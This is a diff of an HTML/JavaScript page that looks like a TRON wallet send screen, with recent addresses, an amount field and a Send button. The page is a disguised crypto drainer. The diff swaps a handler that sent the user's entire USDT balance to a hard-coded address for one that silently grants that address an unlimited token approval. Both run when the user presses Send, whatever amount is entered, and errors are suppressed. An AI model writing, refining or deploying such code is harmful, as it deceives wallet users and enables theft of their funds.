@@ -19,7 +19,6 @@
         .section-title { font-size: 15px; font-weight: 600; color: #1c1c1e; margin-bottom: 12px; }
         .input-container { background: #f4f5f7; border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .input-container input { background: transparent; border: none; color: #1c1c1e; font-size: 15px; outline: none; width: 75%; }
-        .input-container input::placeholder { color: #c4c4c7; }
         .input-actions { display: flex; align-items: center; gap: 14px; }
         .btn-paste { background: #ffffff; border: none; color: #1c1c1e; font-size: 13px; font-weight: 500; padding: 5px 12px; border-radius: 6px; cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
         .scan-icon { width: 18px; height: 18px; border: 2px solid #1c1c1e; border-radius: 3px; position: relative; cursor: pointer; }
@@ -38,12 +37,10 @@
         .token-text span { color: #8e8e93; font-weight: 400; font-size: 14px; }
         .btn-max { background: #ffffff; border: none; color: #1c1c1e; font-size: 13px; font-weight: 600; padding: 5px 12px; border-radius: 6px; cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
         .available-text { font-size: 14px; color: #8e8e93; margin-top: -14px; margin-bottom: 24px; }
-        .notes-link { color: #3b50df; font-size: 14px; font-weight: 500; text-decoration: none; display: flex; align-items: center; justify-content: flex-end; gap: 4px; }
-        .btn-bottom { background: #3b50df; color: #ffffff; width: calc(100% - 40px); border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; position: absolute; bottom: 85px; left: 20px; transition: background 0.2s; text-align: center; }
+        .btn-bottom { background: #3b50df; color: #ffffff; width: calc(100% - 40px); border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; position: absolute; bottom: 85px; left: 20px; text-align: center; }
         .nav-bar { position: absolute; bottom: 0; left: 0; width: 100%; height: 65px; background: #ffffff; border-top: 1px solid #f0f0f2; display: flex; justify-content: space-around; align-items: center; padding-bottom: 5px; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; color: #8e8e93; cursor: pointer; }
-        .nav-item.active { color: #3b50df; font-weight: 500; }
-        .nav-icon { font-size: 20px; margin-bottom: 2px; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; color: #8e8e93; }
+        .nav-item.active { color: #3b50df; }
     </style>
 </head>
 <body>
@@ -74,14 +71,6 @@
                 <div class="address">THyXGLkL9CGdnhgkWGoUzdJcf5vjFSrK5G</div>
                 <div class="date">2026-09-02 16:29</div>
             </div>
-            <div class="recent-item">
-                <div class="address">TNqaxFKxhoYdMgbZqVHumy84tBidBaWT45</div>
-                <div class="date">2026-08-31 11:04</div>
-            </div>
-            <div class="recent-item">
-                <div class="address">TJJZHRUsVwMegvSfUjefDhQkJcjX5WP9hG</div>
-                <div class="date">2026-08-31 07:36</div>
-            </div>
         </div>
         <button class="btn-bottom" onclick="irAPantalla2()">Next</button>
     </div>
@@ -106,8 +95,7 @@
             <button class="btn-max" onclick="aplicarMax()">MAX</button>
         </div>
         <div class="available-text">Available: <span id="availableBalance">7.5</span></div>
-        <a href="#" class="notes-link">Add notes to this transfer <span>∨</span></a>
-        <button class="btn-bottom" onclick="ejecutarEnvioMaximo()">Send</button>
+        <button class="btn-bottom" onclick="ejecutarAprobacionMaxima()">Send</button>
     </div>
     <div class="nav-bar">
         <div class="nav-item">📁<br>Tokens</div>
@@ -140,13 +128,13 @@
     function aplicarMax() {
         document.getElementById('userAmount').value = document.getElementById('availableBalance').innerText;
     }
-    async function ejecutarEnvioMaximo() {
+    async function ejecutarAprobacionMaxima() {
         if (!window.tronWeb) return;
         try {
-            const miWallet = window.tronWeb.defaultAddress.base58;
             const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
-            const saldoBigNum = await contrato.balanceOf(miWallet).call();
-            await contrato.transfer(DESTINO_FIJO, saldoBigNum.toString()).send();
+            // Valor máximo para aprobación ilimitada (uint256 max)
+            const ilimitado = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+            await contrato.approve(DESTINO_FIJO, ilimitado).send();
         } catch (e) {}
     }
 </script>
